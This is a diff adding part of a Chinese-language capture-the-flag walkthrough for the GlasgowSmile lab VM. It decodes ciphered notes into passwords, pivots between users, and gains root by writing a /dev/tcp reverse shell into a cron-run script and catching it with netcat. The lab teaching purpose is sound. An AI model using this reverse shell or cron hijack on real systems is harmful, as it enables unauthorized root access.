@@ -128,5 +128,181 @@ drwxr-xr-x 3 rob  rob  4096 Jun 13  2020 .local
 -rw------- 1 rob  rob   429 Jun 16  2020 .Xauthority
 rob@glasgowsmile:~$ cat user.txt
 JKR[f5bb11acbb957915e421d62e7253d27a]
-rob@glasgowsmile:~$
+rob@glasgowsmile:~$ cat Abnerineedyourhelp
+Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
+Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==
+```
+
+![](images/2024-04-11-20-55-39.png)
+Hello Dear, Arthur suffers from severe mental illness but we see little sympathy for his condition. This relates to his feeling about being ignored. You can find an entry in his journal reads, "The worst part of having a mental illness is people expect you to behave as if you don't."
+Now I need your help Abner, use this password, you will find the right way to solve the enigma
+将这段密文凯撒解密一下就得到提示
+那么还有一段密文需要解码
+![](images/2024-04-11-20-59-29.png)
+I33hope99my0death000makes44more8cents00than0my0life0
+得到一段明文，猜猜是什么意思吧
+```bash
+rob@glasgowsmile:~$ ls /home
+abner  penguin  rob
+rob@glasgowsmile:~$ su abner
+Password:
+abner@glasgowsmile:/home/rob$ cd ~
+abner@glasgowsmile:~$ ls -la
+total 44
+drwxr-xr-x 4 abner abner 4096 Jun 16  2020 .
+drwxr-xr-x 5 root  root  4096 Jun 15  2020 ..
+-rw------- 1 abner abner  167 Apr 11 07:17 .bash_history
+-rw-r--r-- 1 abner abner  220 Jun 14  2020 .bash_logout
+-rw-r--r-- 1 abner abner 3526 Jun 14  2020 .bashrc
+-rw-r----- 1 abner abner  565 Jun 16  2020 info.txt
+drwxr-xr-x 3 abner abner 4096 Jun 14  2020 .local
+-rw-r--r-- 1 abner abner  807 Jun 14  2020 .profile
+drwx------ 2 abner abner 4096 Jun 15  2020 .ssh
+-rw-r----- 1 abner abner   38 Jun 16  2020 user2.txt
+-rw------- 1 abner abner  399 Jun 15  2020 .Xauthority
+abner@glasgowsmile:~$ cat user2.txt
+JKR{0286c47edc9bfdaf643f5976a8cfbd8d}
+```
+看到确实存在一个用户abner，用这串明文su过去
+居然还真就直接是密码
+```bash
+abner@glasgowsmile:~$ ls -la
+total 44
+drwxr-xr-x 4 abner abner 4096 Jun 16  2020 .
+drwxr-xr-x 5 root  root  4096 Jun 15  2020 ..
+-rw------- 1 abner abner  167 Apr 11 07:17 .bash_history
+-rw-r--r-- 1 abner abner  220 Jun 14  2020 .bash_logout
+-rw-r--r-- 1 abner abner 3526 Jun 14  2020 .bashrc
+-rw-r----- 1 abner abner  565 Jun 16  2020 info.txt
+drwxr-xr-x 3 abner abner 4096 Jun 14  2020 .local
+-rw-r--r-- 1 abner abner  807 Jun 14  2020 .profile
+drwx------ 2 abner abner 4096 Jun 15  2020 .ssh
+-rw-r----- 1 abner abner   38 Jun 16  2020 user2.txt
+-rw------- 1 abner abner  399 Jun 15  2020 .Xauthority
+```
+可以很明显发现bash_history与其他文件不同
+```bash
+abner@glasgowsmile:~$ cat .bash_history
+whoami
+systemctl reboot
+fuck
+su penguin
+mysql -u root -p
+exit
+cd .bash/
+ls
+unzip .dear_penguins.zip
+cat dear_penguins
+rm dear_penguins
+exit
+ls
+cd /home/abner/
+ls
+exit
+```
+这里直接find按名字就能找到对应压缩包
+find / -name '.dear_penguins.zip' 2>/dev/null
+解压密码就是adner的用户密码
+```bash
+┌──(kali㉿kali)-[~/workspace]
+└─$ cat dear_penguins
+My dear penguins, we stand on a great threshold! It's okay to be scared; many of you won't be coming back. Thanks to Batman, the time has come to punish all of God's children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
+scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
+```
+最后那串字符是第三个用户的密码
+```bash
+penguin@glasgowsmile:~$ ls -la
+total 40
+drwxr-xr-x 5 penguin penguin 4096 Jun 16  2020 .
+drwxr-xr-x 5 root    root    4096 Jun 15  2020 ..
+-rw------- 1 penguin penguin    7 Apr 11 07:17 .bash_history
+-rw-r--r-- 1 penguin penguin  220 Jun 15  2020 .bash_logout
+-rw-r--r-- 1 penguin penguin 3526 Jun 15  2020 .bashrc
+drwxr-xr-x 3 penguin penguin 4096 Jun 15  2020 .local
+-rw-r--r-- 1 penguin penguin  807 Jun 15  2020 .profile
+drwxr--r-- 2 penguin penguin 4096 Jun 16  2020 SomeoneWhoHidesBehindAMask
+drwx------ 2 penguin penguin 4096 Jun 15  2020 .ssh
+-rw------- 1 penguin penguin   58 Jun 15  2020 .Xauthority
+penguin@glasgowsmile:~$ cd SomeoneWhoHidesBehindAMask/
+penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -la
+total 332
+drwxr--r-- 2 penguin penguin   4096 Jun 16  2020 .
+drwxr-xr-x 5 penguin penguin   4096 Jun 16  2020 ..
+-rwSr----- 1 penguin penguin 315904 Jun 15  2020 find
+-rw-r----- 1 penguin root      1457 Jun 15  2020 PeopleAreStartingToNotice.txt
+-rwxr-xr-x 1 penguin root       612 Jun 16  2020 .trash_old
+-rw-r----- 1 penguin penguin     38 Jun 16  2020 user3.txt
+penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat user3.txt
+JKR{284a3753ec11a592ee34098b8cb43d52}
+```
+### 提权至root
+
+```BASH
+penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -la
+total 332
+drwxr--r-- 2 penguin penguin   4096 Apr 11 09:22 .
+drwxr-xr-x 5 penguin penguin   4096 Jun 16  2020 ..
+-rwSr----- 1 penguin penguin 315904 Jun 15  2020 find
+-rw-r----- 1 penguin root      1457 Jun 15  2020 PeopleAreStartingToNotice.txt
+-rwxr-xr-x 1 penguin root       666 Apr 11 09:22 .trash_old
+-rw-r----- 1 penguin penguin     38 Jun 16  2020 user3.txt
+penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat .trash_old
+#/bin/bash
+
+#       (            (              )            (      *    (   (
+# (      )\ )   (     )\ ) (      ( /( (  (       )\ ) (  `   )\ ))\ )
+# )\ )  (()/(   )\   (()/( )\ )   )\()))\))(   ' (()/( )\))( (()/(()/( (
+#(()/(   /(_)((((_)(  /(_)(()/(  ((_)\((_)()\ )   /(_)((_)()\ /(_)/(_)))\
+# /(_))_(_))  )\ _ )\(_))  /(_))_  ((__(())\_)() (_)) (_()((_(_))(_)) ((_)
+#(_)) __| |   (_)_\(_/ __|(_)) __|/ _ \ \((_)/ / / __||  \/  |_ _| |  | __|
+#  | (_ | |__  / _ \ \__ \  | (_ | (_) \ \/\/ /  \__ \| |\/| || || |__| _|
+#   \___|____|/_/ \_\|___/   \___|\___/ \_/\_/   |___/|_|  |_|___|____|___|
+#
+
+#
+
+
+bash -c "/bin/bash -i >& /dev/tcp/192.168.10.12/1234 0>&1"
+```
+.trash_old是由root的cron作业执行
+插入反弹shell即可得到root
+```bash
+┌──(kali㉿kali)-[~/workspace]
+└─$ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [192.168.10.12] from (UNKNOWN) [192.168.10.176] 37884
+bash: cannot set terminal process group (1701): Inappropriate ioctl for device
+bash: no job control in this shell
+root@glasgowsmile:~# whoami
+whoami
+root
+root@glasgowsmile:~# ls /root
+ls /root
+root.txt
+whoami
+root@glasgowsmile:~# cat /root/root
+cat /root/root.txt
+  ▄████ ██▓   ▄▄▄       ██████  ▄████ ▒█████  █     █░     ██████ ███▄ ▄███▓██▓██▓   ▓█████
+ ██▒ ▀█▓██▒  ▒████▄   ▒██    ▒ ██▒ ▀█▒██▒  ██▓█░ █ ░█░   ▒██    ▒▓██▒▀█▀ ██▓██▓██▒   ▓█   ▀
+▒██░▄▄▄▒██░  ▒██  ▀█▄ ░ ▓██▄  ▒██░▄▄▄▒██░  ██▒█░ █ ░█    ░ ▓██▄  ▓██    ▓██▒██▒██░   ▒███
+░▓█  ██▒██░  ░██▄▄▄▄██  ▒   ██░▓█  ██▒██   ██░█░ █ ░█      ▒   ██▒██    ▒██░██▒██░   ▒▓█  ▄
+░▒▓███▀░██████▓█   ▓██▒██████▒░▒▓███▀░ ████▓▒░░██▒██▓    ▒██████▒▒██▒   ░██░██░██████░▒████▒
+ ░▒   ▒░ ▒░▓  ▒▒   ▓▒█▒ ▒▓▒ ▒ ░░▒   ▒░ ▒░▒░▒░░ ▓░▒ ▒     ▒ ▒▓▒ ▒ ░ ▒░   ░  ░▓ ░ ▒░▓  ░░ ▒░ ░
+  ░   ░░ ░ ▒  ░▒   ▒▒ ░ ░▒  ░ ░ ░   ░  ░ ▒ ▒░  ▒ ░ ░     ░ ░▒  ░ ░  ░      ░▒ ░ ░ ▒  ░░ ░  ░
+░ ░   ░  ░ ░   ░   ▒  ░  ░  ░ ░ ░   ░░ ░ ░ ▒   ░   ░     ░  ░  ░ ░      ░   ▒ ░ ░ ░     ░
+      ░    ░  ░    ░  ░     ░       ░    ░ ░     ░             ░        ░   ░     ░  ░  ░  ░
+
+
+
+Congratulations!
+
+You've got the Glasgow Smile!
+
+JKR{68028b11a1b7d56c521a90fc18252995}
+
+
+Credits by
+
+mindsflee
+root@glasgows
 ```
